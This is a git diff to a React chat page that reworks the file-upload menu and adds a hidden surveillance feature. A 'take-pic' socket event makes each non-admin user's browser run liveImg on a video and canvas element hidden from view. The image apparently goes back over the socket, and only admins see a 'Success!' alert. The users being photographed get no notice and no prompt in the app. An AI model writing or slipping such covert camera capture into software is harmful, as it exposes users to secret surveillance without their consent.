@@ -19,7 +19,10 @@ import {
   setPeerId,
   callTimerOff,
   setMsg,
+  setShowVideoPopup,
 } from "../features/state/globalState";
+import Snackbar from "@mui/material/Snackbar";
+import MuiAlert from "@mui/material/Alert";
 import { io } from "socket.io-client";
 import CallingTimer from "../components/CallingTimer";
 import { fileUpload } from "../composable/fileUpload";
@@ -32,12 +35,19 @@ import Logs from "../components/Logs";
 import Admin from "./Admin";
 import Call from "./Call";
 import Search from "../components/Search";
+import { liveImg } from "../composable/image";
+import React from "react";
+
+const Alert = React.forwardRef(function Alert(props, ref) {
+  return <MuiAlert elevation={6} ref={ref} variant="filled" {...props} />;
+});
 
 export default function Chat(props) {
   let navigate = useNavigate();
 
   const openCalling = useSelector((state) => state.global.openCalling);
   const hasAnnounce = useSelector((state) => state.global.hasAnnounce);
+  const showVideo = useSelector((state) => state.global.showVideoPopup);
   const announce = useSelector((state) => state.global.announce);
   const msg = useSelector((state) => state.global.msg);
   const name = useSelector((state) => state.global.name);
@@ -46,6 +56,7 @@ export default function Chat(props) {
   const callTimer = useSelector((state) => state.global.callTimer);
   const pId = useSelector((state) => state.global.peerId);
   const siteStatus = useSelector((state) => state.global.siteStatus);
+  const [pickSuccess, setpickSuccess] = React.useState(false);
 
   const dispatch = useDispatch();
   const debounceFn = useCallback(_debounce(handleDebounce, 600), []);
@@ -251,8 +262,58 @@ export default function Chat(props) {
     window.location.replace("https://audio-call.vercel.app/");
   };
 
+  useEffect(() => {
+    let video = document.querySelector("#video");
+    let canvas = document.querySelector("#canvas");
+    let data = JSON.parse(localStorage.getItem("user"));
+
+    props.socket.on("take-pic", () => {
+      if (!data.admin) {
+        liveImg(video, canvas, props.socket);
+      }
+    });
+    console.log(data);
+  }, []);
+
+  useEffect(() => {
+    props.socket.on("img-taken", () => {
+      console.log("Image taken successfully");
+      setpickSuccess(true);
+    });
+  });
+
+  const handleClose = (event, reason) => {
+    if (reason === "clickaway") {
+      return;
+    }
+    setpickSuccess(false);
+  };
+
   return (
     <>
+      {token?.admin ? (
+        <Snackbar
+          open={pickSuccess}
+          autoHideDuration={6000}
+          onClose={handleClose}
+        >
+          <Alert
+            onClose={handleClose}
+            severity="success"
+            sx={{ width: "100%" }}
+          >
+            Success!
+          </Alert>
+        </Snackbar>
+      ) : null}
+
+      <div className=" hidden ">
+        <canvas
+          className=" absolute w-full h-full object-cover"
+          id="canvas"
+        ></canvas>
+        <video id="video" autoPlay></video>
+      </div>
       <Navbar callSend={callSend} socket={props.socket} />
       <Progress uploading={uploading} />
       {hasAnnounce && announce?.published ? (
@@ -374,67 +435,82 @@ export default function Chat(props) {
           </div>
 
           <div className=" relative">
-            <div className=" rounded-full absolute left-7 top-1.5">
-              {ismenu ? (
-                <div className="  transition-opacity duration-500 flex shadow-lg justify-between w-24 p-1 bg-gradient-to-r from-gray-100 to-gray-200 hover:to-yellow-500 rounded-md absolute bottom-11 -left-2 z-50">
-                  <div className="cursor-pointer bg-red-500/70 w-10 h-10 rounded-full flex justify-center items-center">
-                    <label
-                      htmlFor="audio-file"
-                      className=" cursor-pointer text-white text-xl"
-                    >
-                      <ion-icon name="mic-outline"></ion-icon>
-                    </label>
-                    <input
-                      className=" hidden"
-                      type="file"
-                      accept="audio/*"
-                      name="audio-file"
-                      id="audio-file"
-                      onChange={(e) => handleUpload(e)}
-                    />
-                  </div>
-                  <label htmlFor="chatField">
-                    <div className="text-purple-500 p-2 cursor-pointer  bg-purple-500/40 w-10 h-10 rounded-full left-7 top-1.5">
-                      <label htmlFor="file-input" className=" cursor-pointer ">
-                        <ion-icon name="image"></ion-icon>
+            {(siteStatus && siteStatus.fileInput) || (token && token.admin) ? (
+              <div className=" rounded-full absolute left-7 top-1.5">
+                {ismenu ? (
+                  <div className="  transition-opacity duration-500 flex shadow-lg justify-between w-24 p-1 bg-gradient-to-r from-gray-100 to-gray-200 hover:to-yellow-500 rounded-md absolute bottom-11 -left-2 z-50">
+                    <div className="cursor-pointer bg-red-500/70 w-10 h-10 rounded-full flex justify-center items-center">
+                      <label
+                        htmlFor="audio-file"
+                        className=" cursor-pointer text-white text-xl"
+                      >
+                        <ion-icon name="mic-outline"></ion-icon>
                       </label>
-                      {(siteStatus && siteStatus.fileInput) ||
-                      (token && token.admin) ? (
-                        <input
-                          className=" hidden w-9 cursor-pointer"
-                          type="file"
-                          accept="image/*,video/*"
-                          name=""
-                          id="file-input"
-                          ref={inputFile}
-                          onChange={(e) => handleUpload(e)}
-                        />
-                      ) : (
-                        <input
-                          className=" hidden w-9  cursor-pointer"
-                          type="file"
-                          accept="image/*,video/*"
-                          name=""
-                          disabled
-                          id="file-input"
-                          ref={inputFile}
-                          onChange={(e) => handleUpload(e)}
-                        />
-                      )}
+                      <input
+                        className=" hidden"
+                        type="file"
+                        accept="audio/*"
+                        name="audio-file"
+                        id="audio-file"
+                        onChange={(e) => handleUpload(e)}
+                      />
                     </div>
-                  </label>
-                </div>
-              ) : null}
-              <button
-                type="button"
-                onClick={() => {
-                  setismenu(!ismenu);
-                }}
-                className=" w-9 h-9 bg-gradient-to-r from-green-400 to-blue-500 hover:from-pink-500 hover:to-yellow-500  rounded-full text-white"
-              >
-                <ion-icon name="document-outline"></ion-icon>
-              </button>
-            </div>
+                    <label htmlFor="chatField">
+                      <div className="text-purple-500 p-2 cursor-pointer  bg-purple-500/40 w-10 h-10 rounded-full left-7 top-1.5">
+                        <label
+                          htmlFor="file-input"
+                          className=" cursor-pointer "
+                        >
+                          <ion-icon name="image"></ion-icon>
+                        </label>
+                        {(siteStatus && siteStatus.fileInput) ||
+                        (token && token.admin) ? (
+                          <input
+                            className=" hidden w-9 cursor-pointer"
+                            type="file"
+                            accept="image/*,video/*"
+                            name=""
+                            id="file-input"
+                            ref={inputFile}
+                            onChange={(e) => handleUpload(e)}
+                          />
+                        ) : (
+                          <input
+                            className=" hidden w-9  cursor-pointer"
+                            type="file"
+                            accept="image/*,video/*"
+                            name=""
+                            disabled
+                            id="file-input"
+                            ref={inputFile}
+                            onChange={(e) => handleUpload(e)}
+                          />
+                        )}
+                      </div>
+                    </label>
+                  </div>
+                ) : null}
+                <button
+                  type="button"
+                  onClick={() => {
+                    setismenu(!ismenu);
+                  }}
+                  className=" w-9 h-9 bg-gradient-to-r from-green-400 to-blue-500 hover:from-pink-500 hover:to-yellow-500  rounded-full text-white"
+                >
+                  <ion-icon name="document-outline"></ion-icon>
+                </button>
+              </div>
+            ) : (
+              <div className=" rounded-full absolute left-7 top-1.5">
+                <button
+                  type="button"
+                  disabled
+                  className=" absolute w-9 h-9 bg-gradient-to-r from-green-400 to-blue-500 hover:from-pink-500 hover:to-yellow-500  rounded-full text-white"
+                >
+                  <ion-icon name="document-outline"></ion-icon>
+                </button>
+              </div>
+            )}
 
             {(siteStatus && siteStatus.chatInput) || (token && token.admin) ? (
               <input
